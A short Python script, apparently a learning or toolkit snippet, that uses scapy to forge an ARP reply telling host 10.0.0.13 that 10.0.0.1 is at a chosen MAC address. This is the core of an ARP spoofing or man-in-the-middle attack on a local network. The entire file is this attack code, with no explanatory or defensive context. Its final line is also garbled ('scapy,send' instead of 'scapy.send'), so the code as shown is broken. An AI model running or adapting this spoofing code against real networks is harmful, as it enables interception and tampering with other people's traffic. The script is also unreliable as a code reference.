#!/usr/bin/env python3

import scapy.all as scapy

packet = scapy.ARP(op=2,pdst="10.0.0.13", hwdst="7c:d1:c3:ef:5f:4d", psrc="10.0.0.1")
print(packet.show())
print(packet.summary())
scapy,send(packet)